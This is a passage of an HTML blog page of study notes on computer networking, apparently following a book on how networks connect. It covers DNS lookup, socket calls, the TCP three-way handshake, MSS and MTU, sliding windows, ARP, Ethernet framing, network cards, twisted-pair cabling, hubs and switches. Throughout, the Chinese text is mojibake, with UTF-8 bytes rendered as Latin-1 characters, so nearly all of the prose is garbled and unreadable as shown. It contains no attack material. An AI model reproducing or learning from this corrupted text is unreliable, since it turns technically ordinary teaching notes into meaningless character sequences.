‡è¯†ä¸€ä¸ªæ–‡ä»¶ã€‚</p><p>æ¯æ¡è¯·æ±‚æ¶ˆæ¯ä¸­åªèƒ½å†™ä¸€ä¸ªURIï¼Œæ‰€ä»¥æ¯æ¬¡è¯·æ±‚åªèƒ½è·å–ä¸€ä¸ªæ–‡ä»¶ã€‚</p><h2 id="åŸŸåå’ŒIP"><a href="#åŸŸåå’ŒIP" class="headerlink" title="åŸŸåå’ŒIP"></a>åŸŸåå’ŒIP</h2><p>ç›´æ¥ç”¨IPåœ°å€æ¥ä»£æ›¿æœåŠ¡å™¨åç§°ä¹Ÿèƒ½æ­£å¸¸å·¥ä½œï¼Œä½†å¦‚æœWebæœåŠ¡å™¨ä½¿ç”¨äº†è™šæ‹Ÿä¸»æœºåŠŸèƒ½ï¼Œå°±å¯èƒ½æ— æ³•é€šè¿‡IPåœ°å€æ¥è®¿é—®ã€‚</p><p>åŸŸåä¾¿äºè®°å¿†ã€‚<br>IPåœ°å€ä¾¿äºä¼ è¾“ã€‚</p><h2 id="æ“ä½œç³»ç»Ÿçš„Socketåº“"><a href="#æ“ä½œç³»ç»Ÿçš„Socketåº“" class="headerlink" title="æ“ä½œç³»ç»Ÿçš„Socketåº“"></a>æ“ä½œç³»ç»Ÿçš„Socketåº“</h2><p>å«DNSè§£æå™¨ã€‚</p><p>åº“ï¼Œä¸€å †é€šç”¨ç¨‹åºç»„å»ºçš„é›†åˆã€‚</p><p>å‡ ä¸ªå‡½æ•°ï¼š</p><ul><li>socketï¼Œåˆ›å»ºå¥—æ¥å­—ã€‚</li><li>connectï¼Œå®¢æˆ·ç«¯å¥—æ¥å­—ä¸æœåŠ¡ç«¯è¿æ¥ã€‚ä¸‰ä¸ªå‚æ•°ï¼Œæè¿°ç¬¦ï¼ŒæœåŠ¡å™¨IPåœ°å€å’Œç«¯å£å·ã€‚</li><li>writeï¼Œä¸¤ä¸ªå‚æ•°ï¼Œæè¿°ç¬¦å’Œå‘é€æ•°æ®ã€‚</li><li>readï¼Œéœ€æŒ‡å®šæ¥æ”¶ç¼“å†²åŒºã€‚</li><li>closeï¼Œåˆ é™¤å¥—æ¥å­—ã€‚</li></ul><h2 id="DNSæœåŠ¡å™¨"><a href="#DNSæœåŠ¡å™¨" class="headerlink" title="DNSæœåŠ¡å™¨"></a>DNSæœåŠ¡å™¨</h2><p>åŸºæœ¬å·¥ä½œï¼Œæ¥æ”¶æ¥è‡ªå®¢æˆ·ç«¯çš„æŸ¥è¯¢æ¶ˆæ¯ï¼Œç„¶åæ ¹æ®æ¶ˆæ¯çš„å†…å®¹è¿”å›å“åº”ã€‚</p><p>MXï¼Œmail exchange.</p><p>è®°å½•ç±»å‹ï¼ŒAâ€”addressï¼Œå¯¹åº”IPåœ°å€ã€‚<br>MXï¼Œå¯¹åº”é‚®ä»¶æœåŠ¡å™¨ã€‚</p><p>DNSæœåŠ¡å™¨åˆ†å±‚ã€‚<br>åˆ›å»ºå­åŸŸã€‚</p><p>å­åŸŸçš„DNSæœåŠ¡å™¨çš„IPåœ°å€æ³¨å†Œåˆ°ä¸Šçº§DNS æœåŠ¡å™¨ä¸­ã€‚</p><p>DNSæœåŠ¡å™¨å¹¶ä¸ä¼šè½¬å‘è¯·æ±‚ï¼Œåªä¼šç›´æ¥å°†ä¸‹ä¸€å°DNSæœåŠ¡å™¨çš„IPå‘Šè¯‰æˆ‘ä»¬ï¼Œç„¶åæˆ‘ä»¬å†å»å‘èµ·è¯·æ±‚ã€‚</p><p>ä»æ ¹æœåŠ¡å™¨å¼€å§‹æŸ¥è¯¢ã€‚</p><p>DNSæœåŠ¡å™¨æœ‰ç¼“å­˜åŠŸèƒ½ï¼Œå¯ä»¥è®°ä½ä¹‹å‰æŸ¥è¯¢è¿‡çš„åŸŸåã€‚<br>ç¼“å­˜ä¿¡æ¯æœ‰ä¸€ä¸ªæœ‰æ•ˆæœŸã€‚</p><h2 id="å¥—æ¥å­—"><a href="#å¥—æ¥å­—" class="headerlink" title="å¥—æ¥å­—"></a>å¥—æ¥å­—</h2><p>socketï¼Œä¼ è¾“å±‚è¿æ¥é€šä¿¡çš„é€šä¿¡ç«¯ç‚¹ã€‚</p><p>æœåŠ¡å™¨ä¸€èˆ¬ä¼šåœ¨å¯åŠ¨åå°±åˆ›å»ºå¥½å¥—æ¥å­—å¹¶ç­‰å¾…å®¢æˆ·ç«¯è¿æ¥ç®¡é“ã€‚</p><p>æ–­å¼€å¯ä»¥ç”±æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ä»»æ„ä¸€æ–¹å‘èµ·ã€‚</p><p>æ–­å¼€åï¼Œå¥—æ¥å­—ä¼šè¢«åˆ é™¤ã€‚</p><p>åˆ›å»ºå¥—æ¥å­—åä¼šè¿”å›æè¿°ç¬¦ã€‚</p><p>å‡ ä¸ªé˜¶æ®µï¼š</p><ul><li>åˆ›å»ºå¥—æ¥å­—</li><li>è¿æ¥WebæœåŠ¡å™¨</li><li>å‘é€æ•°æ®</li><li>æ¥æ”¶æ•°æ®</li><li>æ–­å¼€è¿æ¥ï¼Œåˆ é™¤å¥—æ¥å­—</li></ul><p>å…¶å®è´¨æ˜¯ä¸€å—å†…å­˜ç©ºé—´ï¼Œè®°å½•äº†ç”¨äºæ§åˆ¶é€šä¿¡æ“ä½œçš„æ§åˆ¶ä¿¡æ¯ã€‚</p><p>åè®®æ ˆæ˜¯æ ¹æ®å¥—æ¥å­—ä¸­è®°å½•çš„æ§åˆ¶ä¿¡æ¯æ¥å·¥ä½œçš„ã€‚</p><p>å¥—æ¥å­—çš„åˆ›å»ºï¼š</p><ul><li>åˆ†é…å†…å­˜ç©ºé—´</li><li>åœ¨æ§åˆ¶ä¿¡æ¯çš„stateåˆ—ä¸­å†™å…¥listening</li><li>åˆ†é…æ•°æ®åŒ…çš„ç¼“å­˜ç©ºé—´</li></ul><h2 id="è¿æ¥æœåŠ¡å™¨"><a href="#è¿æ¥æœåŠ¡å™¨" class="headerlink" title="è¿æ¥æœåŠ¡å™¨"></a>è¿æ¥æœåŠ¡å™¨</h2><p>è¿æ¥å®é™…ä¸Šæ˜¯é€šä¿¡åŒæ–¹äº¤æ¢æ§åˆ¶ä¿¡æ¯(ç”¨æ¥æ§åˆ¶æ•°æ®æ”¶å‘æ“ä½œæ‰€éœ€çš„ä¸€äº›ä¿¡æ¯)ï¼Œå°†å¿…è¦ä¿¡æ¯è®°å½•åœ¨å¥—æ¥å­—å¹¶å‡†å¤‡æ•°æ®æ”¶å‘çš„æ“ä½œã€‚</p><p>å¯ä»¥çœ‹ä½œä¸ºâ€œå‡†å¤‡â€ã€‚</p><p>æœ‰ä»¥ä¸‹å†…å®¹ï¼š</p><ul><li>æŠŠæœåŠ¡å™¨çš„IPåœ°å€å’Œç«¯å£å·å‘ŠçŸ¥åè®®æ ˆ</li><li>å®¢æˆ·ç«¯å‘æœåŠ¡å™¨ä¼ è¾¾å¼€å§‹é€šä¿¡çš„è¯·æ±‚</li></ul><p>è¿‡ç¨‹</p><ul><li>å®¢æˆ·ç«¯syn</li><li>æœåŠ¡ç«¯synï¼Œack</li><li>å®¢æˆ·ç«¯ack</li></ul><h2 id="Webå’Œç”µå­é‚®ä»¶çš„ç«¯å£å·"><a href="#Webå’Œç”µå­é‚®ä»¶çš„ç«¯å£å·" class="headerlink" title="Webå’Œç”µå­é‚®ä»¶çš„ç«¯å£å·"></a>Webå’Œç”µå­é‚®ä»¶çš„ç«¯å£å·</h2><p>Webâ€”-80<br>ç”µå­é‚®ä»¶â€”-25</p><h2 id="HTTPå·¥ä½œæµç¨‹"><a href="#HTTPå·¥ä½œæµç¨‹" class="headerlink" title="HTTPå·¥ä½œæµç¨‹"></a>HTTPå·¥ä½œæµç¨‹</h2><ul><li>è¿æ¥</li><li>å‘é€è¯·æ±‚æ¶ˆæ¯</li><li>æ¥æ”¶å“åº”æ¶ˆæ¯</li><li>æ–­å¼€</li></ul><h2 id="è§£æå™¨"><a href="#è§£æå™¨" class="headerlink" title="è§£æå™¨"></a>è§£æå™¨</h2><p>Resolverï¼Œå°†åŸŸåè½¬æ¢ä¸ºIPåœ°å€ã€‚</p><h2 id="TCPå’ŒUDP"><a href="#TCPå’ŒUDP" class="headerlink" title="TCPå’ŒUDP"></a>TCPå’ŒUDP</h2><p>æµè§ˆå™¨ã€é‚®ä»¶ç­‰ä¸€èˆ¬åº”ç”¨ç¨‹åºæ”¶å‘æ•°æ®æ—¶ç”¨TCPã€‚</p><p>DNSæŸ¥è¯¢ç­‰æ”¶å‘è¾ƒçŸ­çš„æ§åˆ¶æ•°æ®æ—¶ç”¨UDPã€‚</p><h2 id="PID"><a href="#PID" class="headerlink" title="PID"></a>PID</h2><p>Process IDentifierï¼Œè¿›ç¨‹æ ‡è¯†ç¬¦ã€‚</p><h2 id="é€šä¿¡ä¸­çš„æ§åˆ¶ä¿¡æ¯"><a href="#é€šä¿¡ä¸­çš„æ§åˆ¶ä¿¡æ¯" class="headerlink" title="é€šä¿¡ä¸­çš„æ§åˆ¶ä¿¡æ¯"></a>é€šä¿¡ä¸­çš„æ§åˆ¶ä¿¡æ¯</h2><ul><li><p>å¤´éƒ¨ä¿¡æ¯<br>æŒ‡æ˜ä¼ é€çš„å¯¹è±¡å’Œå‘é€çš„ä¿¡æ¯ã€‚</p></li><li><p>å¥—æ¥å­—ä¸­è®°å½•çš„ä¿¡æ¯</p></li></ul><h2 id="SYN"><a href="#SYN" class="headerlink" title="SYN"></a>SYN</h2><p>Synchronise Sequence Numbersï¼ŒåŒæ­¥åºåˆ—ç¼–å·ã€‚</p><p>ç”¨äºè¡¨ç¤ºè¿æ¥çŠ¶æ€</p><p>ACKç”¨äºè¡¨ç¤ºæ¶ˆæ¯çš„æ¥æ”¶çŠ¶æ€ã€‚<br>ACKåºå·æ˜¯ä¸€ä¸ªéšæœºå€¼ã€‚<br>ackåºå·åœ¨äº¤äº’è¿‡ç¨‹ä¸­ä¼šæ”¹å˜ã€‚</p><h2 id="æ”¶å‘æ•°æ®"><a href="#æ”¶å‘æ•°æ®" class="headerlink" title="æ”¶å‘æ•°æ®"></a>æ”¶å‘æ•°æ®</h2><p>åè®®æ ˆå¹¶ä¸æ˜¯ä¸€æ”¶åˆ°æ•°æ®å°±å‘é€å‡ºå»ï¼Œè€Œæ˜¯ä¼šå­˜æ”¾åœ¨å†…éƒ¨çš„å‘é€ç¼“å­˜åŒºã€‚</p><p>ä¸¤ä¸ªåˆ¤æ–­è¦ç´ ï¼š</p><ul><li>é•¿åº¦ï¼ŒMSS</li><li>æ—¶é—´</li></ul><p>æˆ–åº”ç”¨ç¨‹åºæŒ‡å®šã€‚</p><p>å‘é€è¿‡çš„åŒ…ä¼šä¿å­˜åœ¨å‘é€ç¼“å†²åŒºä¸­ã€‚<br>å› æ­¤ï¼Œç½‘å¡ã€é›†çº¿å™¨ã€è·¯ç”±å™¨éƒ½æ²¡æœ‰é”™è¯¯è¡¥å¿æœºåˆ¶ã€‚</p><h3 id="æ¢³ç†"><a href="#æ¢³ç†" class="headerlink" title="æ¢³ç†"></a>æ¢³ç†</h3><p>ä¸¤ç§æƒ…å†µï¼š</p><ul><li>å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€æ¶ˆæ¯</li><li>æœåŠ¡å™¨å‘å®¢æˆ·ç«¯å‘é€æ¶ˆæ¯</li></ul><p>ä¸¤è€…å¯åŒæ—¶è¿›è¡Œã€‚<br>ä»¥å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘é€ä¸ºä¾‹ï¼š</p><ul><li>åº”ç”¨ç¨‹åºå°†æ•°æ®ä¼ é€ç»™åè®®æ ˆ</li><li>æ•°æ®è¿›å…¥åè®®æ ˆå†…éƒ¨çš„å‘é€ç¼“å†²åŒºï¼Œç§¯ç´¯åˆ°ä¸€å®šé‡åå‘é€æˆ–ç­‰å¾…ä¸€æ®µæ—¶é—´åå‘é€</li><li>å‘é€ç¼“å†²åŒºçš„æ•°æ®è¢«ä»¥MSSé•¿åº¦ä¸ºå•ä½æ‹†åˆ†ï¼Œå¹¶è®¡ç®—æ•°æ®é•¿åº¦æ”¾å…¥å¤´éƒ¨ï¼Œä¹‹åæ”¾å…¥å•ç‹¬çš„ç½‘ç»œåŒ…ï¼Œæ ‡è®°ä¸ŠTCPå¤´éƒ¨ï¼Œå¹¶æ ¹æ®å¥—æ¥å­—ä¸Šçš„ä¿¡æ¯æ ‡è®°å‘é€æ–¹å’Œæ¥æ”¶æ–¹çš„ç«¯å£å·ã€‚æœ€åå°†æ•°æ®åŒ…ä¼ ç»™IPæ¨¡å—ã€‚</li><li>IPæ¨¡å—å‘é€æ•°æ®åŒ…ã€‚å¹¶å°†å‘é€è¿‡çš„åŒ…åŒ…å­˜åœ¨å‘é€ç¼“å­˜åŒºä¸­ã€‚</li><li>æœåŠ¡å™¨æ¥æ”¶æ•°æ®åè®¡ç®—ACKå·å¹¶è¿”å›</li></ul><p>ACKå·å’Œåºå·åˆå§‹å€¼ç›¸å…³ã€‚<br>TCPä¼šåŠ¨æ€è®¾ç½®ACKå·çš„ç­‰å¾…æ—¶é—´ã€‚</p><h3 id="MTU"><a href="#MTU" class="headerlink" title="MTU"></a>MTU</h3><p>Maximum Transmission Unitï¼Œè¡¨ç¤ºä¸€ä¸ªç½‘ç»œåŒ…çš„æœ€å¤§é•¿åº¦ã€‚å…¶æ˜¯åŒ…å«å¤´éƒ¨çš„é•¿åº¦ã€‚</p><h3 id="MSS"><a href="#MSS" class="headerlink" title="MSS"></a>MSS</h3><p>Maximum Segment Sizeï¼Œæœ€å¤§åˆ†æ®µå¤§å°ã€‚å»é™¤å¤´éƒ¨çš„å¤§å°ã€‚</p><p>æ•°æ®ä¼šä»¥MSSçš„å¤§å°æ‹†åˆ†ã€‚</p><h3 id="SFD"><a href="#SFD" class="headerlink" title="SFD"></a>SFD</h3><p>Start Frame Delimiterï¼Œèµ·å§‹å¸§åˆ†ç•Œç¬¦ã€‚</p><h3 id="FCS"><a href="#FCS" class="headerlink" title="FCS"></a>FCS</h3><p>Frame Check Sequenceï¼Œå¸§æ ¡éªŒåºåˆ—</p><h2 id="æ»‘åŠ¨çª—å£"><a href="#æ»‘åŠ¨çª—å£" class="headerlink" title="æ»‘åŠ¨çª—å£"></a>æ»‘åŠ¨çª—å£</h2><p>ä¸ºäº†é˜²æ­¢æ¥æ”¶ç¼“å†²åŒºæº¢å‡ºã€‚</p><p>çª—å£å¤§å°ä»£è¡¨äº†ç¼“å†²åŒºå¤§å°ã€‚</p><p>çª—å£çš„å¤§å°æ˜¯åŠ¨æ€å˜åŒ–çš„ã€‚æ›´æ–°æ—¶æœºï¼Œå½“æ¥æ”¶æ–¹å°†æ•°æ®ä¼ é€’ç»™åº”ç”¨ç¨‹åºæ—¶(æ­¤æ—¶æ¥æ”¶ç¼“å†²åŒºä¼šå˜å¤§)ã€‚</p><p>ACKå·å¯åˆå¹¶ï¼Œæ¯”å¦‚è¦è¿”å›ä¸¤ä¸ªACKå·ï¼Œ201ï½400å’Œ401ï½600ï¼Œæ­¤æ—¶å¯åˆå¹¶ä¸ºä¸€ä¸ª201ï½600ã€‚</p><p>åœ¨è¿”å›ACKå·æ—¶è‹¥æ›´æ–°äº†çª—å£å¤§å°ï¼Œåˆ™å¯å°†è¿™ä¸¤ä¸ªä¿¡æ¯ä¸€èµ·è¿”å›ã€‚</p><h2 id="IPåŒ…çš„æ”¶å‘"><a href="#IPåŒ…çš„æ”¶å‘" class="headerlink" title="IPåŒ…çš„æ”¶å‘"></a>IPåŒ…çš„æ”¶å‘</h2><p>å‘é€æ–¹å’Œæ¥æ”¶æ–¹ç»Ÿç§°ä¸ºç»ˆç«¯èŠ‚ç‚¹ï¼Œè½¬å‘è®¾å¤‡è¢«ç§°ä¸ºè½¬å‘èŠ‚ç‚¹æˆ–è€…ä¸­é—´èŠ‚ç‚¹ã€‚</p><p>TCPæ¨¡å—å°†åŒ…ä¼ é€’ç»™IPæ¨¡å—æ—¶ï¼Œéœ€æŒ‡å®šé€šä¿¡å¯¹è±¡çš„IPåœ°å€ã€‚</p><p>IPæ¨¡å—æ·»åŠ ä¸¤ä¸ªå¤´éƒ¨ï¼š</p><ul><li>MACå¤´éƒ¨ï¼ŒåŒ…å«MACåœ°å€ï¼Œç”¨äºå°†åŒ…ä¼ è¾“è‡³æœ€è¿‘çš„è·¯ç”±å™¨çš„æ§åˆ¶ä¿¡æ¯ã€‚</li><li>IPå¤´éƒ¨ï¼Œå°†åŒ…å‘å¾€ç›®çš„åœ°çš„æ§åˆ¶ä¿¡æ¯ã€‚</li></ul><p>IPåœ°å€çš„æœ€åˆæ¥æºæ˜¯åº”ç”¨ç¨‹åºï¼Œåº”ç”¨ç¨‹åºäº¤ç»™TCPæ¨¡å—ï¼ŒTCPæ¨¡å—ä¼ é€’ç»™IPæ¨¡å—ã€‚</p><p>IPåœ°å€å®é™…ä¸Šæ˜¯åˆ†é…ç»™ç½‘å¡çš„ã€‚</p><p>åè®®å·ã€‚</p><p>MACå¤´ä¸­å†™çš„MACåœ°å€åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä¼šæ”¹å˜ã€‚</p><p>ä»¥å¤ªç±»å‹å°±æ˜¯ä½¿ç”¨çš„åè®®ç±»å‹ã€‚</p><h3 id="ARPè¡¨"><a href="#ARPè¡¨" class="headerlink" title="ARPè¡¨"></a>ARPè¡¨</h3><p>æŸ¥è¯¢ç›®æ ‡è·¯ç”±å™¨çš„MACåœ°å€ã€‚</p><p>å¯èƒ½å‘ç”Ÿçš„é€šè®¯å¼‚å¸¸ï¼Œå½“IPåœ°å€æ”¹å˜æ—¶ï¼ŒARPç¼“å­˜è¡¨ä¸­çš„å€¼å¹¶æœªæ”¹å˜ã€‚</p><h3 id="ä»¥å¤ªç½‘"><a href="#ä»¥å¤ªç½‘" class="headerlink" title="ä»¥å¤ªç½‘"></a>ä»¥å¤ªç½‘</h3><p>ä¸€ç§ä»¥å¤šå°è®¡ç®—æœºèƒ½å½¼æ­¤è‡ªç”±å’Œå»‰ä»·åœ°é€šä¿¡è€Œè®¾è®¡çš„é€šä¿¡æŠ€æœ¯ã€‚</p><p>æœ€å¼€å§‹ï¼Œä»¥å¤ªç½‘ä¸­ä¸€ä¸ªè®¾å¤‡å‘é€ä¿¡å·ï¼Œå…¶ä»–è®¾å¤‡éƒ½ä¼šæ¥æ”¶åˆ°ã€‚</p><p>ä¸‰ä¸ªæœªæ”¹å˜çš„åŸºæœ¬æ€§è´¨ï¼š</p><ul><li>åŒ…å‘é€åˆ°MACå¤´éƒ¨ä¸­çš„æ¥æ”¶æ–¹çš„MACåœ°å€ï¼Œå³ç›®çš„åœ°ã€‚</li><li>ç”¨MACå¤´éƒ¨ä¸­çš„å‘é€æ–¹çš„MACåœ°å€è¯†åˆ«å‘é€æ–¹ã€‚</li><li>ç”¨ä»¥å¤ªç±»å‹è¯†åˆ«åŒ…çš„å†…å®¹ã€‚</li></ul><p>ä»¥å¤ªç±»å‹å°±æ˜¯åè®®ç±»å‹ã€‚</p><h2 id="ç½‘å¡-1"><a href="#ç½‘å¡-1" class="headerlink" title="ç½‘å¡"></a>ç½‘å¡</h2><p>ç»“æ„ï¼š</p><p><img src="/media/16516425247159.png"></p><p>ç¡¬ä»¶è®¾å¤‡éƒ½æœ‰é©±åŠ¨ç¨‹åºã€‚</p><p>ç½‘å¡é©±åŠ¨ç¨‹åºä¹Ÿæ˜¯å‚å•†å¼€å‘çš„ä¸“ç”¨ç¨‹åºã€‚</p><p>ç¡¬ä»¶åœ¨å·¥ä½œå‰è¦åˆå§‹åŒ–ã€‚</p><p>ç½‘å¡çš„ROMä¸­ä¿å­˜ç€å”¯ä¸€çš„MACåœ°å€ã€‚åœ¨ç”Ÿäº§æ—¶å†™å…¥ã€‚</p><p>ç½‘å¡é©±åŠ¨è¿›è¡Œåˆå§‹åŒ–æ—¶åœ¨MACæ¨¡å—ä¸­è®¾ç½®MACåœ°å€ã€‚</p><h3 id="æŠ¥å¤´å’ŒæŠ¥å°¾"><a href="#æŠ¥å¤´å’ŒæŠ¥å°¾" class="headerlink" title="æŠ¥å¤´å’ŒæŠ¥å°¾"></a>æŠ¥å¤´å’ŒæŠ¥å°¾</h3><p>MACæ¨¡å—ä¼šåœ¨åŒ…å¼€å¤´åŠ ä¸ŠæŠ¥å¤´å’Œèµ·å§‹å¸§åˆ†ç•Œç¬¦(é•¿56æ¯”ç‰¹)ï¼Œæœ€åä¸¤ä½ä¸º11.</p><p>åœ¨æœ«å°¾åŠ ä¸Šç”¨äºæ£€æµ‹é”™è¯¯çš„å¸§æ ¡éªŒåºåˆ—(é•¿32æ¯”ç‰¹)ã€‚</p><h3 id="æ—¶é’Ÿä¿¡å·çš„ä½œç”¨"><a href="#æ—¶é’Ÿä¿¡å·çš„ä½œç”¨" class="headerlink" title="æ—¶é’Ÿä¿¡å·çš„ä½œç”¨"></a>æ—¶é’Ÿä¿¡å·çš„ä½œç”¨</h3><p>æ—¶é’Ÿä¿¡å·ï¼Œç”¨äºåˆ¤æ–­å‡ºæ¯”ç‰¹ä¹‹é—´çš„ç•Œé™ã€‚å“ªä¸€æˆªæ˜¯ä¸€æ¯”ç‰¹ï¼Œç”±æ—¶é’Ÿä¿¡å·åˆ¤æ–­ã€‚</p><p>å¯ä»¥å†³å®šæ˜¯åœ¨ä¸Šå‡æ²¿æˆ–ä¸‹é™æ²¿è¯»å–ç”µå‹å’Œç”µæµä¿¡å·ã€‚</p><p>è§£å†³æ—¶é’Ÿåç§»çš„é—®é¢˜ï¼Œå‘é€çš„ä¿¡å·ä¸ºæ•°æ®ä¿¡å·å’Œæ—¶é’Ÿä¿¡å·çš„å åŠ ã€‚</p><h3 id="æŠ¥å¤´çš„ä½œç”¨"><a href="#æŠ¥å¤´çš„ä½œç”¨" class="headerlink" title="æŠ¥å¤´çš„ä½œç”¨"></a>æŠ¥å¤´çš„ä½œç”¨</h3><p>ç”¨äºæµ‹é‡æ—¶é’Ÿä¿¡å·ã€‚</p><h2 id="å‘é€æ–¹å¼"><a href="#å‘é€æ–¹å¼" class="headerlink" title="å‘é€æ–¹å¼"></a>å‘é€æ–¹å¼</h2><ul><li>é›†çº¿å™¨çš„åŠåŒå·¥æ¨¡å¼ï¼Œå³åŒä¸€æ—¶åˆ»åªèƒ½è¿›è¡Œå‘é€å’Œæ¥æ”¶ä¸­çš„ä¸€ç§ã€‚</li><li>å…¨åŒå·¥æ¨¡å¼ï¼ŒåŒä¸€æ—¶åˆ»å‘é€å’Œæ¥æ”¶èƒ½åŒæ—¶è¿›è¡Œã€‚</li></ul><h3 id="ç½‘ç»œçš„ä¼ è¾“é€Ÿç‡"><a href="#ç½‘ç»œçš„ä¼ è¾“é€Ÿç‡" class="headerlink" title="ç½‘ç»œçš„ä¼ è¾“é€Ÿç‡"></a>ç½‘ç»œçš„ä¼ è¾“é€Ÿç‡</h3><p>å³æ•°å­—ä¿¡æ¯è½¬æ¢ä¸ºç”µä¿¡å·çš„é€Ÿç‡ã€‚</p><h3 id="MAUæ¨¡å—"><a href="#MAUæ¨¡å—" class="headerlink" title="MAUæ¨¡å—"></a>MAUæ¨¡å—</h3><p>å°†MACæ¨¡å—ç”Ÿæˆçš„é€šç”¨ä¿¡å·è½¬æ¢æˆå¯åœ¨ç½‘çº¿ä¸­ä¼ è¾“çš„æ ¼å¼ï¼Œå¹¶é€šè¿‡ç½‘çº¿å‘é€å‡ºå»ã€‚</p><p>è¿˜å…·ç›‘å¬ä½œç”¨ã€‚</p><p>ä¿¡å·ç¢°æ’ã€‚</p><h3 id="ä¸­æ–­"><a href="#ä¸­æ–­" class="headerlink" title="ä¸­æ–­"></a>ä¸­æ–­</h3><p>ä¸€ç§ç”µä¿¡å·ï¼Œç”±ç¡¬ä»¶äº§ç”Ÿï¼Œå¹¶ç›´æ¥é€åˆ°ä¸­æ–­æ§åˆ¶å™¨ä¸Šï¼Œç„¶åå†ç”±ä¸­æ–­æ§åˆ¶å™¨å‘CPUå‘é€ä¿¡å·ï¼ŒCPUæ£€æµ‹åˆ°ä¿¡å·åï¼Œå°±ä¼šä¸­æ–­å½“å‰çš„å·¥ä½œè½¬è€Œå»å¤„ç†ä¸­æ–­ã€‚</p><p>å°±æ˜¯è®©CPUåœä¸‹(æŒ‚èµ·)å½“å‰çš„ç¨‹åºï¼Œè€Œè¿è¡Œä¸­æ–­å¤„ç†çš„ç¨‹åºã€‚</p><p>åœ¨è¿™é‡Œï¼Œå½¢è±¡çš„è¯´ä¸­æ–­å°±æ˜¯â€œæ•²é—¨â€è¿™ä¸ªåŠ¨ä½œã€‚</p><h3 id="ä¸»è¦çš„ICMPæ¶ˆæ¯"><a href="#ä¸»è¦çš„ICMPæ¶ˆæ¯" class="headerlink" title="ä¸»è¦çš„ICMPæ¶ˆæ¯"></a>ä¸»è¦çš„ICMPæ¶ˆæ¯</h3><p><img src="/media/16516477115302.png"></p><h2 id="æ¥æ”¶æœåŠ¡å™¨å“åº”"><a href="#æ¥æ”¶æœåŠ¡å™¨å“åº”" class="headerlink" title="æ¥æ”¶æœåŠ¡å™¨å“åº”"></a>æ¥æ”¶æœåŠ¡å™¨å“åº”</h2><p>åˆ†ç‰‡é‡ç»„ã€‚</p><p>å¥—æ¥å­—å·¥ä½œã€‚</p><h2 id="UDPåè®®çš„æ”¶å‘æ“ä½œ"><a href="#UDPåè®®çš„æ”¶å‘æ“ä½œ" class="headerlink" title="UDPåè®®çš„æ”¶å‘æ“ä½œ"></a>UDPåè®®çš„æ”¶å‘æ“ä½œ</h2><p>å‘DNSæœåŠ¡å™¨æŸ¥è¯¢IPçš„æ—¶å€™ä½¿ç”¨çš„æ˜¯UDPåè®®ã€‚</p><p>éŸ³é¢‘å’Œè§†é¢‘æ•°æ®ä½¿ç”¨UDPå‘é€</p><h2 id="ä¿¡å·åœ¨ç½‘çº¿å’Œé›†çº¿å™¨ä¸­ä¼ è¾“"><a href="#ä¿¡å·åœ¨ç½‘çº¿å’Œé›†çº¿å™¨ä¸­ä¼ è¾“" class="headerlink" title="ä¿¡å·åœ¨ç½‘çº¿å’Œé›†çº¿å™¨ä¸­ä¼ è¾“"></a>ä¿¡å·åœ¨ç½‘çº¿å’Œé›†çº¿å™¨ä¸­ä¼ è¾“</h2><p>ç°åœ¨çš„å®¶ç”¨è·¯ç”±å™¨å·²é›†æˆäº†é›†çº¿å™¨å’Œäº¤æ¢æœºçš„åŠŸèƒ½ã€‚</p><p>ç”µä¿¡å·çš„é¢‘ç‡è¶Šé«˜ï¼Œèƒ½é‡çš„æŸå¤±ç‡è¶Šå¤§ã€‚</p><h3 id="åŒç»çº¿"><a href="#åŒç»çº¿" class="headerlink" title="åŒç»çº¿"></a>åŒç»çº¿</h3><p>åŒç»çº¿ï¼ŒæŠ‘åˆ¶å™ªå£°ã€‚</p><p>åˆ†æ­£è´Ÿä¸¤æ¡ç½‘çº¿ã€‚</p><p>ç”µç£æ³¢æ¥è§¦é‡‘å±ç­‰å¯¼ä½“ï¼Œä¼šåœ¨å…¶ä¸­äº§ç”Ÿç”µæµï¼Œå› æ­¤ï¼Œè‹¥ç½‘çº¿å‘¨å›´æœ‰ç”µç£æ³¢ï¼Œå°±ä¼šäº§ç”Ÿå’ŒåŸæœ¬çš„ä¿¡å·ä¸åŒçš„ç”µæµã€‚</p><p>å™ªå£°åˆ†å†…æºæ€§å™ªå£°å’Œå¤–æºæ€§å™ªå£°ã€‚</p><h3 id="é›†çº¿å™¨"><a href="#é›†çº¿å™¨" class="headerlink" title="é›†çº¿å™¨"></a>é›†çº¿å™¨</h3><p>å°†ä¿¡å·å¹¿æ’­ã€‚</p><h4 id="MDI-x2F-MDI-Xåˆ‡æ¢å¼€å…³"><a href="#MDI-x2F-MDI-Xåˆ‡æ¢å¼€å…³" class="headerlink" title="MDI&#x2F;MDI-Xåˆ‡æ¢å¼€å…³"></a>MDI&#x2F;MDI-Xåˆ‡æ¢å¼€å…³</h4><p>Media Dependent Interfaceï¼Œåª’ä½“ç›¸å…³æ¥å£ï¼Œç›´è¿æ¥çº¿ï¼Œç”¨äºé›†çº¿å™¨ä¹‹é—´è¿æ¥ã€‚</p><p>Media Dependent Interface- Crossoverã€‚äº¤å‰æ¥çº¿ï¼Œç”¨äºé›†çº¿å™¨å’Œè®¾å¤‡ä¹‹é—´è¿æ¥ã€‚</p><p>ç›´è¿æ¥çº¿å°±æ˜¯â€œå‘é€çº¿è·¯â€è¿â€œå‘é€çº¿è·¯â€ï¼Œâ€œæ¥æ”¶çº¿è·¯â€è¿â€œæ¥æ”¶çº¿è·¯â€ã€‚</p><p>äº¤å‰æ¥çº¿æ˜¯â€œå‘é€çº¿è·¯â€æ¥â€œæ¥æ”¶çº¿è·¯â€ï¼Œåä¹‹äº¦ç„¶ã€‚</p><h3 id="äº¤æ¢æœº"><a href="#äº¤æ¢æœº" class="headerlink" title="äº¤æ¢æœº"></a>äº¤æ¢æœº</h3><p>å‡ ä¹éƒ½æœ‰çš„ç»“æ„ï¼Œå†…å­˜ã€MACæ¨¡å—å’ŒPHYæ¨¡å—ã€‚</p><p>å‡ 